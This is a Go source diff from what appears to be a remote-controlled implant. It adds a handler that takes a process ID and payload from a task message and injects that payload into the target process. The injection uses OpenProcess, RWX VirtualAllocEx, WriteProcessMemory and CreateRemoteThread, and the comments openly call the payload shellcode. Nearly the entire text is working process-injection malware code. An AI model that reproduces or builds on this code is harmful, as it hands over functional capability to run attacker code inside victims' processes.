@@ -42,12 +42,13 @@ func taskHandler(send chan pb.Envelope, data []byte) {
 }
 
 func remoteTaskHandler(send chan pb.Envelope, data []byte) {
-	task := &pb.Task{}
-	err := proto.Unmarshal(data, task)
+	remoteTask := &pb.RemoteTask{}
+	err := proto.Unmarshal(data, remoteTask)
 	if err != nil {
 		log.Printf("Error decoding message: %v", err)
 		return
 	}
+	remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
 }
 
 func psHandler(send chan pb.Envelope, data []byte) {
@@ -128,7 +129,7 @@ func injectTask(processHandle Handle, data []byte) error {
 
 	// Create native buffer with the shellcode
 	dataSize := len(data)
-	log.Println("[*] creating native data buffer ...")
+	log.Println("creating native data buffer ...")
 	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	if dataAddr == 0 {
 		return err
@@ -139,9 +140,9 @@ func injectTask(processHandle Handle, data []byte) error {
 	}
 
 	// Remotely allocate memory in the target process
-	log.Println("[*] allocating remote process memory ...")
+	log.Println("allocating remote process memory ...")
 	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	log.Printf("[*] virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
+	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	if remoteAddr == 0 {
 		log.Println("[!] failed to allocate remote process memory")
 		return err
@@ -149,16 +150,16 @@ func injectTask(processHandle Handle, data []byte) error {
 
 	// Write the shellcode into the remotely allocated buffer
 	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(dataAddr), ptr(dataSize), 0)
-	log.Printf("[*] writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
+	log.Printf("writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
 	if writeMemorySuccess == 0 {
 		log.Printf("[!] failed to write data into remote process")
 		return err
 	}
 
 	// Create the remote thread to where we wrote the shellcode
-	log.Println("[*] successfully injected data, starting remote thread ....")
+	log.Println("successfully injected data, starting remote thread ....")
 	createThreadSuccess, _, err := createRemoteThread.Call(uintptr(processHandle), 0, 0, uintptr(remoteAddr), 0, 0, 0)
-	log.Printf("[*] createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
+	log.Printf("createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
 	if createThreadSuccess == 0 {
 		log.Printf("[!] failed to create remote thread")
 		return err
@@ -166,11 +167,11 @@ func injectTask(processHandle Handle, data []byte) error {
 	return nil
 }
 
-// OpenProcessHandle - Returns the handle for a given process id
-func OpenProcessHandle(processID int) (Handle, error) {
-	log.Println("[*] obtaining process handle for pid ...")
+// openProcessHandle - Returns the handle for a given process id
+func openProcessHandle(processID int) (Handle, error) {
+	log.Println("obtaining process handle for pid ...")
 	handle, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(processID))
-	log.Printf("[*] openprocess returned: handle = %v, err = %v", handle, err)
+	log.Printf("openprocess returned: handle = %v, err = %v", handle, err)
 	if handle == 0 {
 		log.Println("[!] failed to obtain process handle")
 		return 0, err
@@ -179,8 +180,8 @@ func OpenProcessHandle(processID int) (Handle, error) {
 }
 
 // RemoteThreadTaskInjection - Injects Task into a processID using remote threads
-func RemoteThreadTaskInjection(processID int, data []byte) error {
-	processHandle, err := OpenProcessHandle(processID)
+func remoteThreadTaskInjection(processID int, data []byte) error {
+	processHandle, err := openProcessHandle(processID)
 	if processHandle == 0 {
 		return err
 	}
